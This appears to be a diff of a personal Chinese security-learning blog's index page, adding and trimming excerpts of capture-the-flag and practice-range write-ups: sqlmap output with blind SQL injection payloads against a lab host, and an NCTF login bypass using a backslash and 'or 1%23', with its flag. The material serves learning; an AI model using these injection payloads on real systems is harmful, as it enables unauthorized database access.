@@ -8,12 +8,19 @@
   <link rel="dns-prefetch" href="http://yoursite.com">
   <title>try2be</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
+  <meta name="description" content="个人安全技术学习博客">
+<meta property="og:type" content="website">
 <meta property="og:title" content="try2be">
 <meta property="og:url" content="http://yoursite.com/index.html">
 <meta property="og:site_name" content="try2be">
-<meta property="og:locale" content="en_US">
+<meta property="og:description" content="个人安全技术学习博客">
+<meta property="og:locale" content="zh_CN">
 <meta property="article:author" content="lu2hx0">
+<meta property="article:tag" content="web安全">
+<meta property="article:tag" content="渗透学习">
+<meta property="article:tag" content="安全技术">
+<meta property="article:tag" content="SQL注入">
+<meta property="article:tag" content="CTF">
 <meta name="twitter:card" content="summary">
   
     <link rel="alternative" href="/atom.xml" title="try2be" type="application/atom+xml">
@@ -49,13 +56,13 @@
 		  <h1 class="header-author"><a href="/">lu2hx0</a></h1>
 		</hgroup>
 		
+		<p class="header-subtitle">抱歉，俺太弱了</p>
+		
 
 		<nav class="header-menu">
 			<ul>
 			
 				<li><a href="/">主页</a></li>
-	        
-				<li><a href="/tags/%E9%9A%8F%E7%AC%94/">随笔</a></li>
 	        
 			</ul>
 		</nav>
@@ -107,9 +114,9 @@
 			  <h1 class="header-author js-header-author">lu2hx0</h1>
 			</hgroup>
 			
+			<p class="header-subtitle"><i class="icon icon-quo-left"></i>抱歉，俺太弱了<i class="icon icon-quo-right"></i></p>
 			
 			
-				
 			
 				
 			
@@ -133,9 +140,7 @@
 				<ul style="width: 50%">
 				
 				
-					<li style="width: 50%"><a href="/">主页</a></li>
-		        
-					<li style="width: 50%"><a href="/tags/%E9%9A%8F%E7%AC%94/">随笔</a></li>
+					<li style="width: 100%"><a href="/">主页</a></li>
 		        
 				</ul>
 			</nav>
@@ -152,6 +157,83 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-墨者学院-SQL注入漏洞测试-布尔盲注" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/01/22/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95-%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/">墨者学院-SQL注入漏洞测试-布尔盲注</a>
+    </h1>
+  
+
+        
+        <a href="/2020/01/22/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95-%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/" class="archive-article-date">
+  	<time datetime="2020-01-22T07:47:24.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-01-22</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>进入靶场后点击发现公告栏的url是<a href="http://219.153.49.228:40888/new_list.php?id=1" target="_blank" rel="noopener">http://219.153.49.228:40888/new_list.php?id=1</a><br>放入sqlmap<br>sqlmap.py -u <a href="http://219.153.49.228:40888/new_list.php?id=1" target="_blank" rel="noopener">http://219.153.49.228:40888/new_list.php?id=1</a><br>返回结果是:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">GET parameter &#39;id&#39; is vulnerable. Do you want to keep testing the others (if any)? [y&#x2F;N]</span><br><span class="line">sqlmap identified the following injection point(s) with a total of 271 HTTP(s) requests:</span><br><span class="line">---</span><br><span class="line">Parameter: id (GET)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: AND boolean-based blind - WHERE or HAVING clause</span><br><span class="line">    Payload: id&#x3D;1 AND 7805&#x3D;7805</span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &lt; 5.0.12 AND time-based blind (heavy query)</span><br><span class="line">    Payload: id&#x3D;1 AND 9892&#x3D;BENCHMARK(5000000,MD5(0x5444486f))</span><br><span class="line">---</span><br><span class="line">[14:02:15] [INFO] the back-end DBMS is MySQL</span><br><span class="line">web application technology: Nginx, PHP 5.6.39</span><br><span class="line">back-end DBMS: MySQL &lt; 5.0.12</span><br><span class="line">[14:02:15] [WARNING] HTTP error codes detected during run:</span><br><span class="line">500 (Internal Server Error) - 153 times</span><br><span class="line">[14:02:15] [INFO] fetched data logged to text files under &#39;C:\Users\86150\AppData\Local\sqlmap\output\219.153.49.228&#39;</span><br></pre></td></tr></table></figure>
+        
+          <a class="article-more-a" href="/2020/01/22/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95-%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/#more">more >></a>
+        
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">墨者学院·</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2020/01/22/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95-%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-SQL1" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -159,7 +241,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2020/01/09/SQL1/">SQL1</a>
+      <a class="article-title" href="/2020/01/09/SQL1/">sql1</a>
     </h1>
   
 
@@ -177,20 +259,10 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">#GOAL: login as admin,then get the flag;</span><br><span class="line">error_reporting(0);</span><br><span class="line">require &#39;db.inc.php&#39;;</span><br><span class="line"></span><br><span class="line">function clean($str)&#123;</span><br><span class="line">	if(get_magic_quotes_gpc())&#123;</span><br><span class="line">		$str&#x3D;stripslashes($str);</span><br><span class="line">	&#125;</span><br><span class="line">	return htmlentities($str, ENT_QUOTES);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$username &#x3D; @clean((string)$_GET[&#39;username&#39;]);</span><br><span class="line">$password &#x3D; @clean((string)$_GET[&#39;password&#39;]);</span><br><span class="line"></span><br><span class="line">$query&#x3D;&#39;SELECT * FROM users WHERE name&#x3D;\&#39;&#39;.$username.&#39;\&#39; AND pass&#x3D;\&#39;&#39;.$password.&#39;\&#39;;&#39;;</span><br><span class="line">$result&#x3D;mysql_query($query);</span><br><span class="line">if(!$result || mysql_num_rows($result) &lt; 1)&#123;</span><br><span class="line">	die(&#39;Invalid password!&#39;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo $flag;</span><br><span class="line">--&gt;</span><br><span class="line">Invalid password!</span><br></pre></td></tr></table></figure>
 <p>首先查阅源码中的新函数</p>
 <ul>
-<li>magic_quotes_runtime<br>在php的配置文件中，有个布尔值的设置，就是magic_quotes_runtime,当它打开时，php的大部分函数自动的给从外部引入的(包括数据库或者文件)数据中的溢出字符加上反斜线</li>
-<li>get_magic_quotes_gpc<br>(PHP 4, PHP 5, PHP 7),get_magic_quotes_gpc — 获取当前 magic_quotes_gpc 的配置选项设置<br>如果 magic_quotes_gpc 为关闭时返回 0，否则返回 1。在 PHP 5.4.O 起将始终返回 FALSE。</li>
-<li>stripslashes()<br>返回一个去除转义反斜线后的字符串（&#39; 转换为 ‘ 等等）。双反斜线（\）被转换为单个反斜线（\）。 </li>
-<li>htmlentities()<br>htmlentities() 函数把字符转换为 HTML 实体。</li>
-<li>ENT_QUOTES<br>If ENT_QUOTES is set, both single and double quotes are translated<br>如果被设置后，单引号双引号都被转义了<br>——</li>
-</ul>
-<p>这样看来，if(get_magic_quotes_gpc()){$str=stripslashes($str);}好像就是没有什么用？，暂时这样理解，那clean函数就是 htmlentities($str, ENT_QUOTES); 也就是将字符串的单双引号转义！所以没有办法直接用单引号来闭合!<br>这时候想起了题目一开始得到的提示——反斜杠用来转义<br>再看这一句</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE name&#x3D;\&#39;&#39;.$username.&#39;\&#39; AND pass&#x3D;\&#39;&#39;.$password.&#39;\&#39;;</span><br></pre></td></tr></table></figure>
-<p>再去掉&#39;</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE name&#x3D;&#39;.$username.&#39; AND pass&#x3D;&#39;.$password.&#39;;</span><br></pre></td></tr></table></figure>
-<p>已知无法用单引号闭合，那就用反斜杠来结合username后的引号将语句构造成</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE name&#x3D;&#39;.$username. AND pass&#x3D;&#39;.$password.&#39;;</span><br></pre></td></tr></table></figure>
-<p>试一下username=&amp;password= or 1%23,成功，<br>flag=nctf{sql_injection_is_interesting}<br>说明对clean的理解是对的<br>date: 2020-01-09 20:20:26</p>
-
+<li>magic_quotes_runtime<br>在php的配置文件中，有个布尔值的设置，就是magic_quotes_runtime,当它打开时，php的大部分函数自动的给从外部引入的(包括数据库或者文件)数据中的溢出字符加上反斜线
+        
+          <a class="article-more-a" href="/2020/01/09/SQL1/#more">more >></a>
+        
       
 
       
@@ -198,6 +270,17 @@
     <div class="article-info article-info-index">
       
       
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">NCTF</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
       
 
       
@@ -324,15 +407,10 @@
 <h6 id="0x00-设置-global-account"><a href="#0x00-设置-global-account" class="headerlink" title="0x00:设置 global account"></a>0x00:设置 global account</h6><p>git config –global user.name 内容<br>git config –global user.email 内容</p>
 <h6 id="0x01-ssh-key-enter×3"><a href="#0x01-ssh-key-enter×3" class="headerlink" title="0x01:ssh key,enter×3"></a>0x01:ssh key,enter×3</h6><p>ssh-keygen -t rsa -C “<a href="mailto:email@email.com">email@email.com</a>“                 –一般这个user.email是github账号</p>
 <h6 id="0x02：clone"><a href="#0x02：clone" class="headerlink" title="0x02：clone"></a>0x02：clone</h6><p>git clone xxx.xxx.xxx<br>0x03：分支<br>git branch                       –查看当前分支<br>git branch name                  –创建分支<br>git checkout name                –切换到自己创建的分支<br>git branch -d name               –删除本地分支</p>
-<h6 id="0x04：标签"><a href="#0x04：标签" class="headerlink" title="0x04：标签"></a>0x04：标签</h6><p>git tag tagname                  –对当前版本建立标签<br>git tag tagname commit_id       –对历史版本建立标签<br>git tag -a tagname -m “描述…” commit_id 添加说明<br>git tag                          –查看所有标签<br>git show tagname                 –查看某个标签具体信息<br>git tag -d tagname               –删除本地标签<br>git push origin tagname          –推送本地的某个标签到远程<br>git push origin –tags            –一次性推送所有分支<br>git tag -d tagname               –先删除本地<br>git push origin :refs/tags/tagname      –从远程删</p>
-<h6 id="0x05-配置"><a href="#0x05-配置" class="headerlink" title="0x05: 配置"></a>0x05: 配置</h6><p>git config -l                    –查看现在的git环境详细配置</p>
-<h3 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h3><h6 id="0x01：cd"><a href="#0x01：cd" class="headerlink" title="0x01：cd"></a>0x01：cd</h6><h6 id="0x02：ls"><a href="#0x02：ls" class="headerlink" title="0x02：ls -"></a>0x02：ls -</h6><h6 id="0x03：mkdir"><a href="#0x03：mkdir" class="headerlink" title="0x03：mkdir"></a>0x03：mkdir</h6><h6 id="0x04-rm"><a href="#0x04-rm" class="headerlink" title="0x04: rm"></a>0x04: rm</h6><h6 id="0x05：mv"><a href="#0x05：mv" class="headerlink" title="0x05：mv"></a>0x05：mv</h6><h6 id="0x06：cp"><a href="#0x06：cp" class="headerlink" title="0x06：cp"></a>0x06：cp</h6><h6 id="0x07：find"><a href="#0x07：find" class="headerlink" title="0x07：find"></a>0x07：find</h6><h6 id="0x08：touch"><a href="#0x08：touch" class="headerlink" title="0x08：touch"></a>0x08：touch</h6><h6 id="0x09：vi-vim"><a href="#0x09：vi-vim" class="headerlink" title="0x09：vi/vim"></a>0x09：vi/vim</h6><ul>
-<li>dd, /, i/o/a, :</li>
-<li>[esc]</li>
-<li>:q ,:q! ,:wq <h6 id="0x0a-cat"><a href="#0x0a-cat" class="headerlink" title="0x0a: cat"></a>0x0a: cat</h6><h6 id="0x0b-more"><a href="#0x0b-more" class="headerlink" title="0x0b: more"></a>0x0b: more</h6><h6 id="0x0c-less"><a href="#0x0c-less" class="headerlink" title="0x0c: less"></a>0x0c: less</h6><h6 id="0x0d-tail"><a href="#0x0d-tail" class="headerlink" title="0x0d: tail"></a>0x0d: tail</h6><h6 id="0x0e-su"><a href="#0x0e-su" class="headerlink" title="0x0e: su"></a>0x0e: su</h6><h6 id="0x0f-sudo"><a href="#0x0f-sudo" class="headerlink" title="0x0f: sudo"></a>0x0f: sudo</h6><h6 id="0x10-pwd"><a href="#0x10-pwd" class="headerlink" title="0x10: pwd"></a>0x10: pwd</h6><h6 id="0x11-ps-ef"><a href="#0x11-ps-ef" class="headerlink" title="0x11: ps -ef"></a>0x11: ps -ef</h6><h6 id="0x12-kill"><a href="#0x12-kill" class="headerlink" title="0x12: kill"></a>0x12: kill</h6><h6 id="0x13-ifconfig"><a href="#0x13-ifconfig" class="headerlink" title="0x13: ifconfig"></a>0x13: ifconfig</h6><h6 id="0x14-ip"><a href="#0x14-ip" class="headerlink" title="0x14: ip"></a>0x14: ip</h6><h6 id="0x15-dhclient"><a href="#0x15-dhclient" class="headerlink" title="0x15: dhclient"></a>0x15: dhclient</h6><h3 id="dos"><a href="#dos" class="headerlink" title="dos"></a>dos</h3><h6 id="0x01-dir"><a href="#0x01-dir" class="headerlink" title="0x01: dir"></a>0x01: dir</h6><h6 id="0x02-md"><a href="#0x02-md" class="headerlink" title="0x02: md"></a>0x02: md</h6><h6 id="0x03-rd"><a href="#0x03-rd" class="headerlink" title="0x03: rd"></a>0x03: rd</h6><h6 id="0x04-cd"><a href="#0x04-cd" class="headerlink" title="0x04: cd"></a>0x04: cd</h6><h6 id="0x05-del"><a href="#0x05-del" class="headerlink" title="0x05: del"></a>0x05: del</h6><h6 id="0x06-cls"><a href="#0x06-cls" class="headerlink" title="0x06: cls"></a>0x06: cls</h6><h3 id="hexo"><a href="#hexo" class="headerlink" title="hexo"></a>hexo</h3><h6 id="0x01-init"><a href="#0x01-init" class="headerlink" title="0x01: init"></a>0x01: init</h6><h6 id="0x02-new"><a href="#0x02-new" class="headerlink" title="0x02: new"></a>0x02: new</h6><h6 id="0x03-generate"><a href="#0x03-generate" class="headerlink" title="0x03: generate"></a>0x03: generate</h6><h6 id="0x04-server"><a href="#0x04-server" class="headerlink" title="0x04: server"></a>0x04: server</h6><h6 id="0x05-deploy"><a href="#0x05-deploy" class="headerlink" title="0x05: deploy"></a>0x05: deploy</h6><h6 id="0x06-clean"><a href="#0x06-clean" class="headerlink" title="0x06: clean"></a>0x06: clean</h6></li>
-</ul>
-<p>date：2019年12月31日00:04:07</p>
-
+<h6 id="0x04：标签"><a href="#0x04：标签" class="headerlink" title="0x04：标签"></a>0x04：标签</h6><p>git tag tagname                  –对当前版本建立标签<br>git tag tagname commit_id       –对历史版本建立标签 </p>
+        
+          <a class="article-more-a" href="/2019/12/30/%E5%85%B3%E4%BA%8E%E5%91%BD%E4%BB%A4%E6%95%B4%E7%90%86/#more">more >></a>
+        
       
 
       
@@ -529,6 +607,14 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
             <input type="checkbox" q-on="click:toggleTag(e)" q-attr="checked:showTags">
           </label>
           <ul class="article-tag-list" q-show="showTags">
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">NCTF</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">墨者学院·</a>
+              </li>
             
             <div class="clearfix"></div>
           </ul>
